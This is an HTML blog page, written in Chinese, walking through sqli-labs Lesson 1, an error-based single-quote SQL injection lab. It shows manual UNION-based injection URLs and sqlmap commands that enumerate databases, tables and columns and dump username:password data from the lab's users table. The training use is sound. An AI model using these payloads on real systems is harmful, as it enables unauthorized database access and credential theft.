@@ -1,0 +1,1065 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#fff">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="https://fonts.loli.net/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.4.1" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/fish-32x32.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/fish-16x16.png?v=6.4.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.1" color="#fff">
+
+
+
+  <meta name="msapplication-config" content="/images/browserconfig.xml">
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.4.1',
+    sidebar: {"position":"right","display":"hide","offset":12,"b2t":false,"scrollpercent":true,"onmobile":true},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="sqli-labs lession 1 (基于错误的GET单引号字符型注入) 登录界面 手注判断注入类型 sqli-labs 第一课很人性化地给予提示,在url处添加id。  http://10.60.250.214/Less-1/?id=1  由于是get请求方法,以后碰到就直接填写了。  输入单引号 http://10.60.250.214/Less-1/?id=1&amp;#39;  引起报错You">
+<meta name="keywords" content="Hexo,博客">
+<meta property="og:type" content="website">
+<meta property="og:title" content="0menc&#39;s Blog">
+<meta property="og:url" content="https://yingyingguaier.github.io/img/sql/lesson1/lesson1.html">
+<meta property="og:site_name" content="0menc&#39;s Blog">
+<meta property="og:description" content="sqli-labs lession 1 (基于错误的GET单引号字符型注入) 登录界面 手注判断注入类型 sqli-labs 第一课很人性化地给予提示,在url处添加id。  http://10.60.250.214/Less-1/?id=1  由于是get请求方法,以后碰到就直接填写了。  输入单引号 http://10.60.250.214/Less-1/?id=1&amp;#39;  引起报错You">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.imgur.com/7iOF74D.png">
+<meta property="og:image" content="https://i.imgur.com/wwGtJ0S.png">
+<meta property="og:image" content="https://i.imgur.com/Kgh75tO.png">
+<meta property="og:image" content="https://i.imgur.com/6u8cFW1.png">
+<meta property="og:image" content="https://i.imgur.com/vibteUL.png">
+<meta property="og:image" content="https://i.imgur.com/X5WsedG.png">
+<meta property="og:image" content="https://i.imgur.com/CPbYISh.png">
+<meta property="og:image" content="https://i.imgur.com/TW7fFE7.png">
+<meta property="og:image" content="https://i.imgur.com/ZIXMXUP.png">
+<meta property="og:image" content="https://i.imgur.com/lfKFcjO.png">
+<meta property="og:image" content="https://i.imgur.com/uyB1sZ5.png">
+<meta property="og:image" content="https://i.imgur.com/T9tGY5M.png">
+<meta property="og:image" content="https://i.imgur.com/iQTBrk4.png">
+<meta property="og:image" content="https://i.imgur.com/EtoeD7e.png">
+<meta property="og:image" content="https://i.imgur.com/O4iLDlC.png">
+<meta property="og:image" content="https://i.imgur.com/aW1ZQ52.png">
+<meta property="og:image" content="https://i.imgur.com/yXgseWp.png">
+<meta property="og:image" content="https://i.imgur.com/72LA4RH.png">
+<meta property="og:image" content="https://i.imgur.com/6EobR3x.png">
+<meta property="og:image" content="https://i.imgur.com/ZzNnuBy.png">
+<meta property="og:image" content="https://i.imgur.com/RbMVkf4.png">
+<meta property="og:image" content="https://i.imgur.com/yFC9jZD.png">
+<meta property="og:image" content="https://i.imgur.com/keAEMDi.png">
+<meta property="og:image" content="https://i.imgur.com/mkkn61S.png">
+<meta property="og:image" content="https://i.imgur.com/hclOrZ5.png">
+<meta property="og:image" content="https://i.imgur.com/qrbRqfl.png">
+<meta property="og:updated_time" content="2019-06-19T17:23:14.389Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="0menc&#39;s Blog">
+<meta name="twitter:description" content="sqli-labs lession 1 (基于错误的GET单引号字符型注入) 登录界面 手注判断注入类型 sqli-labs 第一课很人性化地给予提示,在url处添加id。  http://10.60.250.214/Less-1/?id=1  由于是get请求方法,以后碰到就直接填写了。  输入单引号 http://10.60.250.214/Less-1/?id=1&amp;#39;  引起报错You">
+<meta name="twitter:image" content="https://i.imgur.com/7iOF74D.png">
+
+
+
+
+
+
+  <link rel="canonical" href="https://yingyingguaier.github.io/img/sql/lesson1/lesson1.html">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title> | 0menc's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">0menc's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">学习、踩坑及经验分享</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-commonweal">
+    <a href="/404.html" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br>Commonweal 404</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+    
+    
+      
+      
+    
+      
+      
+    
+      
+      
+    
+      
+      
+    
+      
+      
+    
+      
+      
+    
+    
+
+  
+
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    
+    
+    <div class="post-block page">
+      <header class="post-header">
+
+<h1 class="post-title" itemprop="name headline"></h1>
+
+<div class="post-meta">
+  
+  
+
+
+  
+  
+  <ul class="breadcrumb">
+    
+      
+      
+        
+          <li><a href="/img/">IMG</a></li>
+          
+            
+          
+        
+      
+    
+      
+      
+        
+          <li><a href="/img/sql/">SQL</a></li>
+          
+            
+          
+        
+      
+    
+      
+      
+        
+          <li>LESSON1</li>
+        
+      
+    
+      
+      
+        
+          <li><a href="/img/sql/lesson1.html/">LESSON1.HTML</a></li>
+          
+            
+          
+        
+      
+    
+  </ul>
+
+
+</div>
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+        
+        
+          <h1 id="sqli-labs-lession-1-基于错误的GET单引号字符型注入"><a href="#sqli-labs-lession-1-基于错误的GET单引号字符型注入" class="headerlink" title="sqli-labs lession 1 (基于错误的GET单引号字符型注入)"></a>sqli-labs lession 1 (基于错误的GET单引号字符型注入)</h1><hr>
+<h2 id="登录界面"><a href="#登录界面" class="headerlink" title="登录界面"></a>登录界面</h2><p><img src="https://i.imgur.com/7iOF74D.png" alt="1"></p>
+<h2 id="手注"><a href="#手注" class="headerlink" title="手注"></a>手注</h2><h3 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><blockquote>
+<p>sqli-labs 第一课很人性化地给予提示,在url处添加id。</p>
+</blockquote>
+<p><code>http://10.60.250.214/Less-1/?id=1</code><br><img src="https://i.imgur.com/wwGtJ0S.png" alt="2"></p>
+<blockquote>
+<p>由于是get请求方法,以后碰到就直接填写了。</p>
+</blockquote>
+<p>输入单引号</p>
+<p><code>http://10.60.250.214/Less-1/?id=1&#39;</code></p>
+<p><img src="https://i.imgur.com/Kgh75tO.png" alt="3"></p>
+<p>引起报错<br><code>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</code></p>
+<p>根据报错信息,猜测加入的id’参数在SQL语句中应该被对称的单引号包含。</p>
+<p>继续验证猜想:</p>
+<p><code>http://10.60.250.214/Less-1/?id=1&#39; and &#39;1&#39;=&#39;1</code></p>
+<p>页面正常，这里不贴图了</p>
+<p>继续检验</p>
+<p><code>http://10.60.250.214/Less-1/?id=1&#39; and &#39;1&#39;=&#39;2</code></p>
+<p>页面异常</p>
+<p><img src="https://i.imgur.com/6u8cFW1.png" alt="4"></p>
+<p>存在字符型的注入</p>
+<p>在搭建的服务中可以查看SQL语句是怎么写的,就是下图中标记部分</p>
+<p><img src="https://i.imgur.com/vibteUL.png" alt="5"></p>
+<p><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></p>
+<p>通过get请求提交的数据会被$id接收,举个例子，上图中<code>1&#39; and &#39;1&#39;=&#39;2</code>就是我手动输入的部分,在SQL语句中就变成这样:</p>
+<p><code>SELECT * FROM users WHERE id=&#39;1&#39; and &#39;1&#39;=&#39;2&#39; LIMIT 0,1</code></p>
+<p>可以发现我构造的单引号与SQL语句中的单引号形成了对称,最终变成了一个正常的SQL语句。</p>
+<p>但是单单这样还是不够的,<code>and &#39;1&#39;=&#39;2&#39; LIMIT 0,1</code>在SQL语句中还是会执行,可能会对我输入进行干扰。这就需要注释了。</p>
+<p>mysql的注释方式有以下几种：</p>
+<ul>
+<li><p>第一种:#    </p>
+<p>  #在url中编码为<code>%23</code></p>
+</li>
+<li><p>第二种:– (注意–后面还有个空格)</p>
+<p>  空格的编码是<code>%20</code></p>
+</li>
+<li><p>第三种:–+ </p>
+<p>  第二种的变形,浏览器会把<code>+</code>编码成空格</p>
+</li>
+</ul>
+<p><code>&#39;</code>的url编码为<code>%27</code>,下面的测试先把单引号用<code>%27</code>表示,空格用<code>%20</code>表示,#用<code>%23</code>,避免出问题。在url中输入如下:</p>
+<blockquote>
+<p>第一种:#</p>
+</blockquote>
+<p><code>http://10.60.250.214/Less-1/?id=1%27%20%23</code></p>
+<p><img src="https://i.imgur.com/X5WsedG.png" alt="6"></p>
+<blockquote>
+<p>第二种：– (注意–后面还有个空格)</p>
+</blockquote>
+<p><code>http://10.60.250.214/Less-1/?id=1%27%20--%20</code></p>
+<p><img src="https://i.imgur.com/CPbYISh.png" alt="7"></p>
+<blockquote>
+<p>第三种:–+</p>
+</blockquote>
+<p><code>http://10.60.250.214/Less-1/?id=1%27%20--+</code></p>
+<p><img src="https://i.imgur.com/TW7fFE7.png" alt="8"></p>
+<h3 id="猜字段"><a href="#猜字段" class="headerlink" title="猜字段"></a>猜字段</h3><h4 id="猜字段数"><a href="#猜字段数" class="headerlink" title="猜字段数"></a>猜字段数</h4><p>这里我采用第一种注释方式,当然其他的也可以。</p>
+<p><code>http://10.60.250.214/Less-1/?id=1%27%20order%20by%203%23</code></p>
+<p>这里我换了个hackbar插件,原来那个有bug</p>
+<p><img src="https://i.imgur.com/ZIXMXUP.png" alt="9"></p>
+<p>order by 数字1~3显示的都与这个页面相同,表示至少有3个字段</p>
+<p><code>http://10.60.250.214/Less-1/?id=1%27%20order%20by%204%23</code></p>
+<p><img src="https://i.imgur.com/lfKFcjO.png" alt="10"></p>
+<p>图片上的报错信息是:</p>
+<p><code>SELECT * FROM users WHERE id=&#39;1&#39; order by 4#&#39; LIMIT 0,1
+Unknown column &#39;4&#39; in &#39;order clause&#39;</code></p>
+<p>说明第4个字段不存在,那就只有3个字段。</p>
+<h4 id="猜字段排序"><a href="#猜字段排序" class="headerlink" title="猜字段排序"></a>猜字段排序</h4><p>使用union select联合查询,后面接查到的字段个数。如下:</p>
+<p><code>http://10.60.250.214/Less-1/?id=1%27%20union%20select%201,2,3%23</code></p>
+<p><img src="https://i.imgur.com/uyB1sZ5.png" alt="11"></p>
+<p>可是怎么让我填写的数字显示出来呢,这就是个问题了,查看一下源码:</p>
+<p><img src="https://i.imgur.com/T9tGY5M.png" alt="12"></p>
+<p>标记的位置就是关键函数。mysql_fetch_array函数会从返回查询到的数据的一行,这里我查询到的是id=1的数据,改变id能查询到另外的数据,修改id=2。</p>
+<p><code>http://10.60.250.214/Less-1/?id=2%27%20union%20select%201,2,3%23</code></p>
+<p><img src="https://i.imgur.com/iQTBrk4.png" alt="13"></p>
+<p>显示出id=2的数据信息。</p>
+<p>将id修改为数据表中不可能存在的一个数,前面查询会变为空,执行我们的联合查询语句。这里将id修改为-1。</p>
+<p><code>http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,2,3%23</code></p>
+<p><img src="https://i.imgur.com/EtoeD7e.png" alt="14"></p>
+<p>显示出字段顺序,推测字段中排序顺序应该是id,name,password。</p>
+<h3 id="获取数据库信息"><a href="#获取数据库信息" class="headerlink" title="获取数据库信息"></a>获取数据库信息</h3><p>user():返回当前数据库连接使用的用户</p>
+<p>database():返回当前数据库连接使用的数据库</p>
+<p>version():返回当前数据库的版本</p>
+<p><code>http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,user(),database()%23</code></p>
+<p><img src="https://i.imgur.com/O4iLDlC.png" alt="15"></p>
+<h3 id="获取表"><a href="#获取表" class="headerlink" title="获取表"></a>获取表</h3><p>group_concat函数:将查询到的多行结果连接成字符串</p>
+<p><code>http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,user(),group_concat(table_name) from information_schema.tables where table_schema=database()%23</code></p>
+<p><img src="https://i.imgur.com/aW1ZQ52.png" alt="16"></p>
+<h3 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h3><p><code>http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,%20user(),group_concat(column_name)%20from%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20TABLE_NAME=%27users%27%23</code></p>
+<p><img src="https://i.imgur.com/yXgseWp.png" alt="17"></p>
+<h3 id="获取值"><a href="#获取值" class="headerlink" title="获取值"></a>获取值</h3><p><code>http://10.60.250.214/Less-1/?id=-1&#39; union select 1,2,group_concat(username,&#39;:&#39;,password) from users%23</code></p>
+<p><img src="https://i.imgur.com/72LA4RH.png" alt="18"></p>
+<h2 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h2><h3 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h3><p>SQLMAP的基础命令如下：</p>
+<blockquote>
+<p>列举数据库</p>
+</blockquote>
+<p>sqlmap -u “注入地址” -v 1 –-dbs</p>
+<blockquote>
+<p>当前数据库</p>
+</blockquote>
+<p>sqlmap -u “注入地址” -v 1 –-current-db</p>
+<blockquote>
+<p>列数据库用户</p>
+</blockquote>
+<p>sqlmap -u “注入地址” -v 1 –-users</p>
+<blockquote>
+<p>当前用户</p>
+</blockquote>
+<p>sqlmap -u “注入地址” -v 1 –-current-user</p>
+<blockquote>
+<p>列举数据库的表名</p>
+</blockquote>
+<p>sqlmap -u “注入地址” -v 1 -D “数据库” –-tables</p>
+<blockquote>
+<p>获取表的列名<br>sqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” –-columns</p>
+</blockquote>
+<blockquote>
+<p>获取表中的数据<br>sqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” -C “字段” –-dump</p>
+</blockquote>
+<h3 id="获取数据库"><a href="#获取数据库" class="headerlink" title="获取数据库"></a>获取数据库</h3><p><strong>-u</strong><br><font color="#8470FF"><br><strong>指定url</strong><br></font></p>
+<p><strong>–dbs</strong><br><font color="#8470FF"><br><strong>爆破数据库</strong><br></font></p>
+<p><strong>–batch</strong><br><font color="#8470FF"><br><strong>默认运行</strong><br></font></p>
+<p><strong>–technique</strong><br><font color="#8470FF"></font></p>
+<p>指定sqlmap使用的检测技术</p>
+<ul>
+<li><p>B:Boolean-based-blind  （布尔型型注入）</p>
+</li>
+<li><p>E:Error-based   （报错型注入）</p>
+</li>
+<li><p>U:Union query-based  （联合注入）</p>
+</li>
+<li><p>S:Starked queries   （通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入）</p>
+</li>
+<li><p>T:Time-based blind  （基于时间延迟注入）</p>
+</li>
+</ul>
+
+
+<p><code>sqlmap -u &quot;http://10.60.250.214/Less-1/?id=1&quot; --dbs --batch --technique B</code></p>
+<p><img src="https://i.imgur.com/6EobR3x.png" alt="20"></p>
+<p><img src="https://i.imgur.com/ZzNnuBy.png" alt="19"></p>
+<h3 id="获取表-1"><a href="#获取表-1" class="headerlink" title="获取表"></a>获取表</h3><p><code>sqlmap -u &quot;http://10.60.250.214/Less-1/?id=1&quot; -v 1 -D security --tables</code></p>
+<p><img src="https://i.imgur.com/RbMVkf4.png" alt="22"></p>
+<p><img src="https://i.imgur.com/yFC9jZD.png" alt="21"></p>
+<h3 id="获取表的列名"><a href="#获取表的列名" class="headerlink" title="获取表的列名"></a>获取表的列名</h3><p><code>sqlmap -u &quot;http://10.60.250.214/Less-1/?id=1&quot; -v 1 -D security -T users --columns</code></p>
+<p><img src="https://i.imgur.com/keAEMDi.png" alt="24"></p>
+<p><img src="https://i.imgur.com/mkkn61S.png" alt="23"></p>
+<h3 id="获取表中数据"><a href="#获取表中数据" class="headerlink" title="获取表中数据"></a>获取表中数据</h3><p><code>sqlmap -u &quot;http://10.60.250.214/Less-1/?id=1&quot; -v 1 -D security -T users --columns --dump</code></p>
+<p><img src="https://i.imgur.com/hclOrZ5.png" alt="26"></p>
+<p><img src="https://i.imgur.com/qrbRqfl.png" alt="25"></p>
+
+        
+      </div>
+      
+      
+      
+    </div>
+    
+
+
+  
+  
+  <ul class="breadcrumb">
+    
+      
+      
+        
+          <li><a href="/img/">IMG</a></li>
+          
+            
+          
+        
+      
+    
+      
+      
+        
+          <li><a href="/img/sql/">SQL</a></li>
+          
+            
+          
+        
+      
+    
+      
+      
+        
+          <li>LESSON1</li>
+        
+      
+    
+      
+      
+        
+          <li><a href="/img/sql/lesson1.html/">LESSON1.HTML</a></li>
+          
+            
+          
+        
+      
+    
+  </ul>
+
+
+    
+    
+    
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <a href="/">
+                <img class="site-author-image" itemprop="image" src="/images/jack.jpg" alt="嘤嘤怪er">
+              </a>
+            
+              <p class="site-author-name" itemprop="name">嘤嘤怪er</p>
+              <p class="site-description motion-element" itemprop="description">0menc</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">101</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">16</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sqli-labs-lession-1-基于错误的GET单引号字符型注入"><span class="nav-number">1.</span> <span class="nav-text">sqli-labs lession 1 (基于错误的GET单引号字符型注入)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#登录界面"><span class="nav-number">1.1.</span> <span class="nav-text">登录界面</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#手注"><span class="nav-number">1.2.</span> <span class="nav-text">手注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#判断注入类型"><span class="nav-number">1.2.1.</span> <span class="nav-text">判断注入类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#猜字段"><span class="nav-number">1.2.2.</span> <span class="nav-text">猜字段</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#猜字段数"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">猜字段数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#猜字段排序"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">猜字段排序</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取数据库信息"><span class="nav-number">1.2.3.</span> <span class="nav-text">获取数据库信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取表"><span class="nav-number">1.2.4.</span> <span class="nav-text">获取表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取字段"><span class="nav-number">1.2.5.</span> <span class="nav-text">获取字段</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取值"><span class="nav-number">1.2.6.</span> <span class="nav-text">获取值</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQLMAP"><span class="nav-number">1.3.</span> <span class="nav-text">SQLMAP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基础命令"><span class="nav-number">1.3.1.</span> <span class="nav-text">基础命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取数据库"><span class="nav-number">1.3.2.</span> <span class="nav-text">获取数据库</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取表-1"><span class="nav-number">1.3.3.</span> <span class="nav-text">获取表</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取表的列名"><span class="nav-number">1.3.4.</span> <span class="nav-text">获取表的列名</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取表中数据"><span class="nav-number">1.3.5.</span> <span class="nav-text">获取表中数据</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">嘤嘤怪er</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.4.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.4.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.4.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.4.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.4.1"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+<script type="text/javascript">
+
+    var a_idx = 0;
+    jQuery(document).ready(function($) {
+        $("body").click(function(e) {
+            var a = new Array("富强", "民主", "文明", "和谐", "自由", "平等", "公正" ,"法治", "爱国", "敬业", "诚信", "友善");
+            var $i = $("<span />").text(a[a_idx]);
+            a_idx = (a_idx + 1) % a.length;
+            var x = e.pageX,
+                y = e.pageY;
+            $i.css({
+                "z-index": 99999999999999999999999999999999999999999999999999999999999999999999999999 ,
+                "top": y - 20,
+                "left": x,
+                "position": "absolute",
+                "font-weight": "bold",
+                "color": "#ff6651"
+            });
+            $("body").append($i);
+            $i.animate({
+                    "top": y - 180,
+                    "opacity": 0
+                },
+                1500,
+                function() {
+                    $i.remove();
+                });
+        });
+    });
+</script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300,"bottom":-40},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
